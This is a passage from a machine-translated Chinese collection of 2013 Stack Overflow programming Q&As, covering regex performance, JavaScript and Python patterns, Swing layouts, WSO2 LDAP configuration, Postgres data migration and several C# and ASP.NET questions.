我也不喜欢`([^\@<]+|[^\@])`最后一行中的子模式，它等同于`([^\@<]+|<)`. `[^\@<]+`除非遇到 a `@`or ，否则将贪婪地匹配到字符串的末尾`<`。

我没有看到任何相邻的子模式会匹配相同的文本，这是过度回溯的常见罪魁祸首，但`\s*`由于它们的贪婪和灵活性，包括不匹配和换行符，所有这些似乎都是可疑的。也许您可以将一些 更改为`\s*`您`[ \t]*`知道不想匹配换行符的位置，例如，可能在`if`.

我注意到 nhahtdh 建议您使用原子分组来防止引擎回溯到先前匹配的内容，这当然值得尝试，因为几乎可以肯定，当引擎无法再找到导致匹配的匹配时会导致过度回溯减速。

您想通过该`RegexOptions.Multiline`选项实现什么？你看起来没有使用`^`，否则`$`它不会有任何效果。

的转义`@`是不必要的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-12T15:46:45.140

正如其他人所提到的，您可以通过删除不必要的转义来提高可读性（例如在字符类内部转义`@`或转义字符`\`；例如，使用`[^*]`代替`[^\*]`）。

以下是一些提高性能的想法：

**订购您的不同选择，以便最有可能的选择首先出现。**

正则表达式引擎将尝试按照它们出现在正则表达式中的顺序匹配每个备选方案。如果您将更有可能的选项放在前面，那么引擎将不必浪费时间尝试在大多数情况下与不太可能的替代方案进行匹配。

**删除不必要的回溯**

不是您的“使用”替代方案的结束：`@"| (?<using> \@using \s+ (?<namespace> [\w\.]+ ) (\s*;)? )"`

如果由于某种原因您有大量空白，但`;`在 using 行的末尾没有关闭，则正则表达式引擎必须回溯每个空白字符，直到它最终确定它不能匹配`(\s*;)`。在您的情况下，`(\s*;)?`可以替换为`\s*;?`以防止在这些情况下回溯。

此外，您可以使用原子组`(?>`...`)`来防止通过量词（例如`*`和 `+`）进行回溯。当您找不到匹配项时，这确实有助于提高性能。例如，您的“foreach”替代方案包含`\s* \( \s*`. 如果找到 text `"foreach var..."`，“foreach”替代方案将贪婪地匹配 之后的所有空格`foreach`，然后在找不到开头时失败`(`。然后它将一次回溯一个空白字符，并尝试`(`在前一个位置匹配，直到它确认它不能匹配该行。如果匹配，使用原子组`(?>\s*)\(`将导致正则表达式引擎不会通过 \s* 回溯，从而允许正则表达式更快地失败。

但是在使用它们时要小心，因为在错误的地方使用它们可能会导致意外失败（例如，`'(?>,*);`由于贪婪地`.*`匹配所有字符（包括`;`），并且原子分组`(?>`......`)`阻止正则表达式引擎，因此永远不会匹配任何内容从回溯一个字符以匹配结尾`;`）。

**在您的一些替代方案上“展开循环”，例如您的“评论”替代方案（如果您计划为字符串添加替代方案也很有用）。**

例如：`@"| (?<comment> \@\* ( ([^\*]\@) | (\*[^\@]) | . )* \*\@ )"`

可以换成`@"| (?<comment> @\* [^*]* (\*+[^@][^*]*)* \*+@ )"`

新的正则表达式归结为：

1.  `@\*`: 查找评论的开头`@*`
2.  `[^*]*`：阅读所有“普通字符”（任何不是`*`因为可能表示评论结束的内容）
3.  `(\*+[^@][^*]*)*`: 在评论中包含任何非终结符 *
    *   `(\*+[^@]`：如果我们找到 a `*`，请确保`*`s 的任何字符串都不以 a 结尾`@`
    *   `[^*]*`：返回阅读所有“普通字符”
    *   `)*`: 如果我们找到另一个，则循环回到开头`*`
4.  `\*+@`：最后，抓住评论的结尾，`*@`小心包含任何额外的内容`*`

[您可以从 Jeffrey Friedl 的Mastering Regular Expressions (3rd Edition)](https://rads.stackoverflow.com/amzn/click/com/0596528124)中找到更多关于提高正则表达式性能的想法。

# javascript - Javascript构造函数属性在调用时不起作用

> ID：15392142
> 
> 赞同：0
> 
> 时间：2013-03-13T17:19:36.220
> 
> 标签：javascript, html, validation, constructor

我在创建构造函数属性时遇到问题。在萤火虫控制台中，错误说`"telekomApp.validation.run is not a function"`。该`this.run()`函数应该是`TelekomApp`构造函数的属性，我希望它也可以作为`telekomApp.validation.run()`，但事实并非如此。

请问您能对此有所了解吗？

非常感谢

JS：

```
(function(global) {

var TelekomApp = function() {

    this.validation = function() {

        var userNameField = document.getElementById("username-field"),
            passwordField = document.getElementById("password-field"),
            usernameMsg = document.getElementById("username-msg"),
            passwordMsg = document.getElementById("password-msg");

        this.run = function(tag) { // this method doesn't work...
            var o = this;
        };
      };
  };

  // make global
  global.TelekomApp = TelekomApp;

  // instanciate
  var telekomApp = new TelekomApp;

  // initialise validation...
  telekomApp.validation.run(document.getElementById("login-form"));

}(window)); 
```

HTML：

```
<div id="login">
        <p id="message"></p>
        <form id="login-form" action="#" method="post">
            <fieldset>
                <legend>Please login using your username and password</legend>
                <ol>
                    <li>
                        <label for="username-field">Username <span>*</span></label>
                        <input type="text" id="username-field" placeholder="Type your username" />
                        <span id="username-msg"></span>
                    </li>

                    <li>
                        <label for="password-field">Password <span>*</span></label>
                        <input type="password" id="password-field" placeholder="Type your password" />
                        <span id="password-msg"></span>
                    </li>

                    <li id="button">
                        <input type="submit" id="login-btn" value="Log In" />
                    </li>
                </ol>

            </fieldset>
        </form>
    </div> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T17:26:06.810

```
(function(global) {

var Validation = function() { //constructor for Validation

        var userNameField = document.getElementById("username-field"),
            passwordField = document.getElementById("password-field"),
            usernameMsg = document.getElementById("username-msg"),
            passwordMsg = document.getElementById("password-msg");

        this.run = function(tag) { // this method doesn't work...
            var o = this;
        };
};

var TelekomApp = function() {

    this.validation = new Validation();
  };

  // make global
  global.TelekomApp = TelekomApp;

  // instanciate
  var telekomApp = new TelekomApp;

  // initialise validation...
  telekomApp.validation.run(document.getElementById("login-form"));

}(window)); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T17:32:01.657

`telekomApp.validation.run`被调用时将被添加到对象`telekomApp.validation`中。

`this.validation = function() {`将函数添加到对象但不调用它。而且`this.run = function(tag) {`直接`run`加`telekomApp`，不加`telekomApp.validation`。一个小的改变就可以了：

```
var Validation = function() {
  ...// your code here
}
this.validation = new Validation(); 
```

# python - 使用类装饰器实现后期初始化

> ID：15392143
> 
> 赞同：4
> 
> 时间：2013-03-13T17:19:36.313
> 
> 标签：python, decorator, lazy-initialization

我正在使用一些需要连接到数据库的类。只有在执行实际操作时才真正需要连接。我想延迟连接阶段，直到真正需要它。为此，我想做类似的事情：

```
class MyClass

    def __init__(self):
        self.conn = None

    def connect(self):
        if self.conn : return
        self.conn = ConnectToDatabase()

    @connect
    def do_something1(self):
        self.conn.do_something1()

    @connect
    def do_something2(self):
        self.conn.do_something2() 
```

但我不知道如何为`connect`类定义装饰器。

我当然可以做这样的事情：

```
 def do_something1(self):
        self.connect()
        self.conn.do_something1() 
```

但是使用装饰器似乎是一种更具可读性的解决方案。是否可以？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-13T17:24:21.607

与其尝试装饰需要连接的函数，不如使用属性来获取连接本身。

```
class MyClass(object):

    def __init__(self):
        self._conn = None

    @property
    def conn(self):
        if self._conn is None:
            self._conn = ConnectToDatabase()
        return self._conn

    def do_something1(self):
        self.conn.do_something1()

    def do_something2(self):
        self.conn.do_something2() 
```

至于一个直接的装饰器示例，播放 FJ 的答案：

```
def prerequisite(prerequisite_function, *pre_args, **pre_kwargs):
    def wrapper(func):
        def wrapped(self, *args, **kwargs):
            prerequisite_function(self, *pre_args, **pre_kwargs)
            return func(self, *args, **kwargs)
        return wrapped
    return wrapper

 class MyClass(object):

     def __init__(self):
         self.conn = None

     def connect(self):
         if self.conn is None:
             self.conn = ConnectToDatabase()

     @prerequisite(connect)
     def do_something(self):
         self.conn.do_something() 
```

您还可以`prerequisite`通过使其创建描述符来使其更加健壮，以便它可以正确地处理函数和静态方法以及类和实例方法。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-13T17:35:52.443

我确实喜欢 sr2222 使用属性来获取连接的方法，但是这里有一种带有装饰器的方法，它可能有用或至少提供信息（使用`functools.wraps()`是可选的）：

```
import functools

def require_connection(f):
    @functools.wraps(f)
    def wrapped(self, *args, **kwargs):
        self.connect()
        return f(self, *args, **kwargs)
    return wrapped

class MyClass(object):
    def __init__(self):
        self.conn = None

    def connect(self):
        if self.conn : return
        self.conn = ConnectToDatabase()

    @require_connection
    def do_something1(self):
        self.conn.do_something1()

    @require_connection
    def do_something2(self):
        self.conn.do_something2() 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-13T18:01:04.393

类似于 sr2222 的解决方案，但称其为：a `cached_property`。

代码更紧凑，使用可重用的构建块，并且在我看来更具可读性。

```
class MyClass(object):

    @cached_property
    def conn(self):
        return ConnectToDatabase()

    def do_something1(self):
        self.conn.do_something1()

    def do_something2(self):
        self.conn.do_something2() 
```

的定义`cached_property`可在[此处](http://wiki.python.org/moin/PythonDecoratorLibrary#Cached_Properties)找到。

# java - 如何将 6 个相同大小的 JButton 放入 JPanel？

> ID：15392145
> 
> 赞同：1
> 
> 时间：2013-03-13T17:19:45.083
> 
> 标签：java, swing, jpanel, jbutton

我试图将 6 个 JButtons 放入我的 JPanel 中，这样一行中有 3 个 JButtons，另外 3 个 JButtons 下方。因为我知道明确的 JPanel 与 Flow Layout Manager 一起工作，所以我有了这样一个想法：

```
JFrame frame = new JFrame();
JPanel panel = new JPanel();
frame.getContentPane().add(panel);

JButton button1 = new JButton();
JButton button2 = new JButton();
JButton button3 = new JButton();
JButton button4 = new JButton();
JButton button5 = new JButton();
JButton button6 = new JButton();

button1.setSize((panel.WIDTH)/3,(panel.HEIGHT)/2);
button2.setSize((panel.WIDTH)/3,(panel.HEIGHT)/2);
button3.setSize((panel.WIDTH)/3,(panel.HEIGHT)/2);
button4.setSize((panel.WIDTH)/3,(panel.HEIGHT)/2);
button5.setSize((panel.WIDTH)/3,(panel.HEIGHT)/2);
button6.setSize((panel.WIDTH)/3,(panel.HEIGHT)/2);

panel.add(button1);
panel.add(button2);
panel.add(button3);
panel.add(button4);
panel.add(button5);
panel.add(button6); 
```

不幸的是，这不起作用，我无法成功更改按钮的大小。有人有想法吗？非常感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T17:23:46.817

*   这是[GridLayout的工作](http://docs.oracle.com/javase/tutorial/uiswing/layout/grid.html)

*   覆盖[JPanel](http://docs.oracle.com/javase/tutorial/uiswing/components/panel.html)`getPreferredSize` _

*   `JFrame.pack();`之前打电话`JFrame.setVisible(true);`

*   见[初始线程](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/initial.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T17:22:21.140

你应该使用 a `GridLayout`，如果你想要更多的控制，你也可以使用`GridBagLayout`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-06-01T18:44:21.747

如果您不想使用任何布局管理器，则首先制作`frame.setLayout(null)`并使用`button1.setBounds(x,y,width,height)`每个按钮而不是`setSize()`. 最后 `frame.setVisible(true)`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-13T17:24:11.010

您应该查看其他一些布局，例如`GridLayout`, 或`GridBagLayout`.
[来自 Oracle 的本教程](http://docs.oracle.com/javase/tutorial/uiswing/layout/visual.html)可能会很有用。

但是，在使用布局时，请使用`setPreferredSize(Dimension size)`, 而不是`setSize`.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-13T17:46:56.210

`GridLayout`是个好主意，但如果您不打算向面板添加更多组件或仅以 3 个为一组，[SpringLayout](http://docs.oracle.com/javase/tutorial/uiswing/layout/spring.html)及其`makeGrid`方法也可以解决问题。

# c# - 如何避免在构造函数中分配私有成员

> ID：15392147
> 
> 赞同：1
> 
> 时间：2013-03-13T17:19:54.887
> 
> 标签：c#

我经常发现自己这样做：

```
class MyClass
{
    public MyClass(int x)
    {
        this.x = x;
    }        
    private int x;

    ...
} 
```

每次我添加一个新的私有成员变量进行配置时，我都需要将它添加到构造函数的参数列表中，添加到构造函数体中，并作为成员添加到类中。是否有一个很好的编程模式来避免额外的输入？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T17:26:22.030

一般来说，如果你用一堆必须传递给构造函数的私有成员来实例化一个类，那么你已经在做一些有问题的事情了。

```
MyClass myClass = new MyClass(x, y, z, 7, 'c', someOtherClass) 
```

如果合适，您可以将相关字段封装到结构或不同的类中，如下所示

```
class MyClass
{
    public MyClass(Coordinates coords)
    {
        this.coords = coords;
    }
    private Coordinates coords;

}

public struct Coordinates
{
     public int X{get; set;}
     public int Y{get; set;}
     public int z{get; set;}
} 
```

然后你可以用它来实例化它

```
MyClass myClass = new MyClass(new Coordinates() { X = 1, Y = 2, Z = 3 }); 
```

* * *

如果没有特定的实现，很难确定最佳解决方案，但如果您实际上不必从类外部设置字段，您可以执行类似的操作

```
class MyClass
{
    public MyClass()
    {

    }        
    private int x = 2;

    ...
} 
```

或者

```
class MyClass
{
    public MyClass()
    {
        this.x = 2;
    }        
    private int x;

    ...
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-14T18:49:19.850

我发现我可以滥用继承来实现我的目标。我设置了一个“Loader”子类，它的唯一目的是插入基类的依赖项。然后我们可以使用基类并忘记加载器。

再说一次，这有一个可怕的副作用，就是阻止在基本构造函数中使用这些受保护的成员变量——我们需要使用 .Start() 函数或类似的东西。所以，这是一个非常糟糕的解决方案，虽然节省了一些击键。

```
public class MyClass
{
    protected int param1;
    protected int param2;

    public void DoStuff()
    {
        Console.WriteLine(param1 + param2);
    }
}

public class MyClassLoader : MyClass
{
    public MyClassLoader()
    {
        param1 = 1;
        param2 = 2;
    }
}

class Program
{
    static void Main(string[] args)
    {

        MyClass myObj = new MyClassLoader();
        myObj.DoStuff();

        Console.WriteLine("Press any key to quit.");
        Console.ReadKey();
    }
} 
```

# active-directory - WSO2 身份服务器 - LDAP 用户存储不起作用

> ID：15392148
> 
> 赞同：3
> 
> 时间：2013-03-13T17:19:55.537
> 
> 标签：active-directory, wso2

我正在尝试针对我们的公司 Active Directory 配置 Identity Server (4.1.0)。

我正在使用 ReadOnlyLDAPUserStoreManager 类。这是用户存储的配置：

```
<UserStoreManager class="org.wso2.carbon.user.core.ldap.ReadOnlyLDAPUserStoreManager">
            <Property name="ReadOnly">true</Property>
            <Property name="MaxUserNameListLength">100</Property>
            <Property name="ConnectionURL">ldap://host</Property>
            <Property name="ConnectionName">ommitted</Property>
            <Property name="ConnectionPassword">xxxxxx</Property>
            <Property name="passwordHashMethod">PLAIN_TEXT</Property>
            <Property name="UserSearchBase">searchbase</Property>
            <Property name="UserNameListFilter">(objectClass=user)</Property>
            <Property name="UserNameAttribute">sAMAccountName</Property>
            <Property name="ReadLDAPGroups">true</Property>
            <Property name="GroupSearchBase">groupbase</Property>
            <Property name="GroupNameListFilter">(objectClass=group)</Property>
            <Property name="GroupNameAttribute">sAMAccountName</Property>
            <Property name="MembershipAttribute">memberOf</Property>
            <Property name="UserRolesCacheEnabled">false</Property>
            <Property name="ReplaceEscapeCharactersAtUserLogin">true</Property>
            <Property name="maxFailedLoginAttempt">0</Property> 
        </UserStoreManager> 
```

我已经删除了特定的连接详细信息以及 UserSearchBase 和 GroupSearchBase。IS 启动成功，我可以看到列出的用户和角色。

我遇到以下问题：

*   身份服务器未将分配的角色正确映射到用户。即使我的 AD 使用“memberOf”属性来定义组成员身份，身份服务器也没有分配给特定用户
*   我无法使用 LDAP 存储中的用户登录身份服务器管理 UI。当我以下列方式配置领域/配置时：

    admin AD_user_name admin 每个人 jdbc/WSO2CarbonDB org.wso2.carbon.user.core.config.multitenancy.CommonLDAPRealmConfigBuilder org.wso2.carbon.user.core.config.multitenancy.CommonLDAPRealmConfigBuilder</Property-->

是否有人对与作为活动目录的只读 LDAP 存储集成有任何建议？

**更新** 使用 WSO2 支持，我建议大家等到 IS 4.1.1 再尝试这个特定的用例。旧版本的产品根本不能很好地工作。我会更新，因为我知道更多。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-28T15:29:57.260

我不知道 Active Directory，但是我们在 OpenLDAP 上遇到了类似的问题，我们无法列出用户的角色，原因是，我们的 LDAP 仅使用它的 UID 将用户与组相关联，例如，在角色上，属性 memberUid 是：

```
memberUid = alandaniel 
```

但 WSO2 org.wso2.carbon.user.core.ldap.ReadOnlyLDAPUserStoreManager 期望的方式是：

```
memberUid = uid=alandaniel,ou=x,dc=y,dc=z 
```

所以我不得不自定义 user.core 插件。而不是创建查询：

```
(&(objectClass=posixGroup)(memberUid=uid=alandaniel,ou=x,dc=y,dc=z)) 
```

它现在将使用

```
(&(objectClass=posixGroup)(memberUid=alandaniel)) 
```

所以如果你真的需要自定义它，扩展 ReadOnlyLDAPUserStoreManager 并自定义方法 getExternalRoleListOfUser(..)

*使用的版本是 WSO2 IS 4.1.0 和 WSO2 ESB 4.6.0。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-14T10:09:08.150

我在最近的一次客户互动中使用了附加的配置，你可以试试这个，连接一个对 AD 有读取权限的用户吗？

此外，最新版本的 IS 现在支持多个用户商店。如果您想要一个活动商店，请务必评论默认商店。否则，您需要为每个用户存储添加一个域名（此处为 ad-domain）。

此处描述了用户存储设置：http: [//docs.wso2.org/wiki/display/IS400/Configuring+User+Stores](http://docs.wso2.org/wiki/display/IS400/Configuring+User+Stores)

希望这会有所帮助，伊莎贝尔。

```
<UserStoreManager class="org.wso2.carbon.user.core.ldap.ActiveDirectoryUserStoreManager">
<Property name="DomainName">ad-domain</Property>
<Property name="defaultRealmName">My-Realm</Property>
<Property name="kdcEnabled">false</Property>
<Property name="ConnectionURL">ldap://myserver:389</Property>
<Property name="ConnectionName">CN=yyyy,ou=xxxxx</Property>
<Property name="ConnectionPassword">xxxxxxx</Property>
<Property name="passwordHashMethod">PLAIN_TEXT</Property>
<Property name="UserSearchBase">ou=xxxx,...</Property>
<Property name="UserEntryObjectClass">user</Property>
<Property name="UserNameAttribute">sAMAccountName</Property>
<Property name="isADLDSRole">false</Property>
<Property name="userAccountControl">512</Property>
<Property name="UserNameListFilter">(objectClass=user)</Property>
<Property name="UserNameSearchFilter">(&amp;(objectClass=user)(cn=?))</Property>
<Property name="UsernameJavaRegEx">[a-zA-Z0-9._-|//]{3,30}$</Property>
<Property name="UsernameJavaScriptRegEx">^[\\S]{3,30}$</Property>
<Property name="PasswordJavaScriptRegEx">^[\\S]{5,30}$</Property>
<Property name="RolenameJavaScriptRegEx">^[\\S]{3,30}$</Property>
<Property name="RolenameJavaRegEx">[a-zA-Z0-9._-|//]{3,30}$</Property>
<Property name="ReadLDAPGroups">true</Property>
<Property name="WriteLDAPGroups">false</Property>
<Property name="EmptyRolesAllowed">true</Property>
<Property name="GroupSearchBase">ou=xxxxx</Property>
<Property name="GroupEntryObjectClass">group</Property>
<Property name="GroupNameAttribute">cn</Property>
<Property name="MembershipAttribute">member</Property>
<Property name="GroupNameListFilter">(objectcategory=group)</Property>
<Property name="GroupNameSearchFilter">(&amp;(objectClass=group)(cn=?))</Property>
<Property name="UserRolesCacheEnabled">true</Property>
<Property name="Referral">follow</Property>
<Property name="BackLinksEnabled">true</Property>
<Property name="maxFailedLoginAttempt">0</Property>
</UserStoreManager> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-15T03:21:31.693

请参阅 Suresh 的以下博客文章。

[http://sureshatt.blogspot.com/2012/07/how-to-connect-wso2-api-manager-to.html](http://sureshatt.blogspot.com/2012/07/how-to-connect-wso2-api-manager-to.html)

它有一个使用的例子`ReadOnlyLDAPUserStoreManager`。

我希望这会有所帮助。

谢谢。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-07-31T18:58:06.023

**更新：**

我可以确认 WSO2 IS 4.1.1 解决了该问题，并且按预期工作。我得出的结论是产品 4.1.0 完全不起作用。

开发团队已经修复了这些功能中的问题，并且在最新版本中。

祝你好运。

# c++ - 无法打开源文件“pthread.h”

> ID：15392152
> 
> 赞同：-1
> 
> 时间：2013-03-13T17:19:59.597
> 
> 标签：c++, multithreading

我正在使用 Visual Studio 并将其包含在我的 stdafx.h 中

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-13T17:21:09.830

Windows 不是 Unix。它有自己的线程 API，可通过`<windows.h>`. 或者，如果您有 C++11，您可以使用新的库工具编写可移植的线程应用程序。

# ruby-on-rails - 如何将 Postgres localhost 开发数据库数据传输到 Rails App 中服务器上的生产数据库？

> ID：15392153
> 
> 赞同：4
> 
> 时间：2013-03-13T17:20:00.940
> 
> 标签：ruby-on-rails, postgresql

我已经在服务器上手动创建了测试、生产和开发数据库，​​但无法弄清楚，如何将数据从本地 myapp_development 数据库传输到服务器上的 myapp_production 数据库？

我搜索并发现[如何将 Rails app + pgsql 数据库从本地主机移动到我的服务器？](https://stackoverflow.com/q/15081590/692622), capistrano 给了我很多错误，我确信必须有一个标准的 Rails 方式或 postgres 方式来执行此操作，因为将数据导出为转储并再次导入它，尽管如果我找不到更好的东西我可能不得不这样做。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-13T17:53:07.123

您可以使用`pg_dump`然后 scp 将数据库转储到数据库并使用在服务器上运行它来转储数据库`psql databse_name < database.dump`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T17:34:28.467

我使用 yaml_db 宝石。它可以将您的数据转储到文件中，然后将其加载回数据库。它是使用 activerecord 编写的，因此它适用于大多数数据库。

网址：[https ://github.com/ludicast/yaml_db](https://github.com/ludicast/yaml_db)

```
rake db:data:dump   ->   Dump contents of Rails database to db/data.yml
rake db:data:load   ->   Load contents of db/data.yml into the database 
```

以 RAILS_ENV=development 或 RAILS_ENV=production 为命令添加前缀以选择目标和目标方案。

# cakephp - 使用 SR.NO 而不是数据库 ID 在 cakephp 分页中排序

> ID：15392154
> 
> 赞同：0
> 
> 时间：2013-03-13T17:20:02.863
> 
> 标签：cakephp, sorting, pagination, cakephp-2.0

大家好，我有关于 cakephp 分页和排序的问题

我已将分页视图设置为流

SR.NO | 姓名 | 地址| 电话|...

SR.NO 是 foreach 循环中的一个简单计数器，用于显示数据而不是数据库 ID

下面的链接显示了我的 SR.NO 是如何创建的

[CakePHP：编号的分页结果](https://stackoverflow.com/questions/1366315/cakephp-numbered-paginated-results)

到目前为止一切都很好...

现在我需要根据 SR.NO 对结果进行排序，但不知道如何实现这一点......

给我的头注入一些光谢谢...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-14T22:43:44.670

如果我理解正确，S.NO 只是结果中的行号，并与 PHP 一起添加。

如果查询*没有*对结果进行排序，并且 S.NO 与数据库中的数据没有关系，**则无法**在此列上进行排序，这样**做没有任何意义。**

### 解释

没有“ORDER BY xxx”的 SQL 查询将以**随机顺序**返回结果；[SQL Server UNION - 默认的 ORDER BY 行为是什么](https://stackoverflow.com/questions/421049/sql-server-union-what-is-the-default-order-by-behaviour)

基本上，这意味着每次运行查询时，结果可能会以不同的顺序返回。

您添加的 S.NO 基于查询返回结果的顺序，但由于此顺序是*随机*的，因此每次查看同一页面时，*同一*记录可能会获得*另一个*位置，从而另一个 S。不

### 选项

指定一个列来对结果进行排序，以便每次结果的顺序都是一致的。如果需要，您也可以*反转*排序顺序。S.NO 仍然可以使用，但纯粹用于*演示*

或者，使用 SQL 计算行位置（[在 MYSQL 查询中获取行位置](https://stackoverflow.com/questions/7057772/get-row-position-in-mysql-query)）。但是，即使在这种情况下，行号也是基于结果中每一行的位置。如果*不* `ORDER BY`存在，则行号仍然是“随机的”，并且每次执行查询时，同一行可能会获得不同的 S.NO / 行号。

The final option is to sort using JavaScript (as others suggested). **however**, also because of the 'random' order, this can only be done for the records that are visible on the page. If you're using pagination (page x of y), sorting the entire database table will require a new query on the database (which cannot be ordered because of the whole 'random' issue)

# c#-4.0 - asp.net mvc 在强类型视图中覆盖数据注释

> ID：15392156
> 
> 赞同：0
> 
> 时间：2013-03-13T17:20:05.793
> 
> 标签：c#-4.0, required-field, data-annotations

我有一个客户对象

```
 [StringLength(50)]
        [Display(Name="First Name")]
        [Required(ErrorMessage = "Required")]
        [RegularExpression("([a-zA-Z]+)", ErrorMessage = "only alphabets allowed")]
        public new string FirstName { get; set; }

        [StringLength(50)]        
        [Display(Name = "Last Name")]
        [Required(ErrorMessage = "Required")]
        [RegularExpression("([a-zA-Z]+)", ErrorMessage = "only alphabets allowed")]
        public new string LastName { get; set; } 
```

我在“添加”视图和“搜索”视图中使用这个对象

看法：

```
 <li>
                     @Html.LabelFor(x=>x.FirstName)
                        @Html.TextBoxFor(x => x.FirstName, new { required=false })
                    </li>

                    <li>
                          @Html.LabelFor(x=>x.LastName)
                        @Html.TextBoxFor(x => x.LastName, new { required=false })
                    </li> 
```

在添加视图中，我希望所有数据注释属性都能正常工作。它正在做相应的事情。但在我的“搜索”视图中，我不希望这些字段是必需的。其余的数据注释可以保留。

这可能吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T13:55:12.540

好。这就是我在我的情况下处理它的方式。我没有创建一个新的 ViewModel，而是在我的所有表单中添加了一个类，`SearchForm`并且使用 JavaScript 我已经删除了它的所有必需属性。

```
//Clear Form Required stuff for search
$(function () {
    $(".SearchForm").find("input:text").each(function () {
        $(this).removeAttr("data-val-required");
    });
    $(".SearchForm").find("select").each(function () {
        $(this).removeAttr("data-val-required");
    });
}); 
```

# objective-c - 您的应用包含非公开 API 使用

> ID：15392157
> 
> 赞同：0
> 
> 时间：2013-03-13T17:20:08.750
> 
> 标签：objective-c, xcode, iphone-sdk-3.0

我正在尝试将我的应用程序提交到 AppStore，但我收到了这个消息：

您的应用包含非公共 API 使用。请检查错误，更正它们，然后重新提交您的申请。

```
The app contais or inherits from non-public classes in Payload/iPark.app/City-6AEFBE8F8D9CC569.o: City 
```

我只使用谷歌地图 api

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-13T17:25:14.800

他们说你有一个名为的类`City`，它与 Apple 的一个私有类的名称冲突。右键单击并选择重构并`City`在`City.h`名称前加上您的姓名首字母。例如，我会命名 mine `JLCity`。

# c# - 使用整数而不是小数

> ID：15392160
> 
> 赞同：-1
> 
> 时间：2013-03-13T17:20:12.733
> 
> 标签：c#, integer, decimal, console-application

我在完成一项特定的家庭作业时遇到了麻烦。这似乎几乎是不可能的。问题是这样的……

“将来，您可能会使用其他不支持精确货币计算的小数类型的编程语言。在这些语言中，您应该使用整数执行此类计算。修改应用程序以仅使用整数来计算复利. 将所有货币金额视为整数的便士。然后分别使用除法和余数运算将结果分成美元和美分部分。在显示结果时在美元和美分部分之间插入句点。

当我按照指示使用整数时，我什至在将任何内容分开之前就得到了这些溢出错误。有谁知道如何使这项工作？这是需要修改的原始代码...

```
 decimal amount; //amount on deposit at end of each year
        decimal principal = 1000; //initial amount before interest
        double rate = 0.05; //interest rate

        //display headers
        Console.WriteLine("Year{0,20}", "Amount on deposit");

        //calculate amount on deposit for each of ten years
        for (int year = 1; year <= 10; year++)
        {
            //calculate new amount for specified year
            amount = principal *
                ((decimal)Math.Pow(1.0 + rate, year));

            //display the year and the amount
            Console.WriteLine("{0,4}{1,20:C}", year, amount);
        } 
```

这是我到目前为止的代码......

```
 long amount; //amount on deposit at end of each year
        long principal = 100000; //initial amount before interest
        long rate = 5; //interest rate
        long number = 100;

        //display headers
        Console.WriteLine("Year{0,20}", "Amount on deposit");

        //calculate amount on deposit for each of ten years
        for (int year = 1; year <= 10; year++)
        {
            //calculate new amount for specified year
            amount = principal *
                ((long)Math.Pow(100 + rate, year));

            amount /= number;

            number *= 10;

            //display the year and the amount
            Console.WriteLine("{0,4}{1,20}", year, amount); 
```

它得到了一些正确的数字，但由于某种原因开始吐出负数。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:25:05.147

只是给你一个提示：

```
int amount;

//...some code...
//let's pretend we have an amount of 100.97
amount = (int)(100.97 * 100); // amount = 10097 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-14T11:02:21.877

`Math.Pow`使用双。用不了多久。
在下一行中，您隐含地将您的费率和年份翻倍。

```
amount = principal *
    ((long)Math.Pow(100 + rate, year)); 
```

所以你实际上是在这样做：

```
double dRate = (double)(100 + rate);
double dYear = (double)year;
double dPow = Math.Pow(dRate, dYear);
amount = principal * (long)dPow; 
```

如果您希望您的 Pow 函数真正使用 long，那么您可能需要自己编写它。

# c# - 如何获取动态生成控件的 ID？

> ID：15392165
> 
> 赞同：1
> 
> 时间：2013-03-13T17:20:32.273
> 
> 标签：c#, asp.net, button, dynamic, file-upload

嗨，

在下图中，表格和其中的控件是动态生成的。

使用下拉列表中没有的值在单击“创建表”按钮时创建表。行作为值。

如何获得特定的“文件上传”和“上传”按钮的 ID。

单击“上传”按钮时，仅应访问与该按钮位于同一行的文件上传控件，并且不应循环遍历表中的所有文件上传控件。

![在此处输入图像描述](../Images/5601adcc75cb94338dae06e32b0dd8d5.png)

在我的代码中，当我单击较低行（例如第 3 行）中的“上传”按钮时，它也会上传在上层文件上传控件中选择的文件（此处为第 1、第 2 行和第 3 行）。

我不想要这个。我只想在单击按钮的同一行中从 filupload 控件上传文件。

**代码 ：**

```
public partial class stable : System.Web.UI.Page
{
private int tblRow;
private int tblCol = 9;
private int i, j;
private bool CTflag;

Table table = new Table();
TableRow row,rrow;
TableCell cell,rcell;
FileUpload fileUp;
Button UpLdButton;
Button btnCal;
TextBox tb;

Label tbr;

string cmdArg; // for passing filuploaders id with Command button

private string filename = "fileUpLoader";

private string tbRowId = "row";
private string tbColId = "col";

protected int Rows
{
    get
    {
        return ViewState["Rows"] != null ? (int)ViewState["Rows"] : 0;
    }
    set
    {
        ViewState["Rows"] = tblRow;
    }
}

// Columns property to hold the Columns in the ViewState
protected int Columns
{
    get
    {
        return ViewState["Columns"] != null ? (int)ViewState["Columns"] : 0;
    }
    set
    {
        ViewState["Columns"] = tblCol;
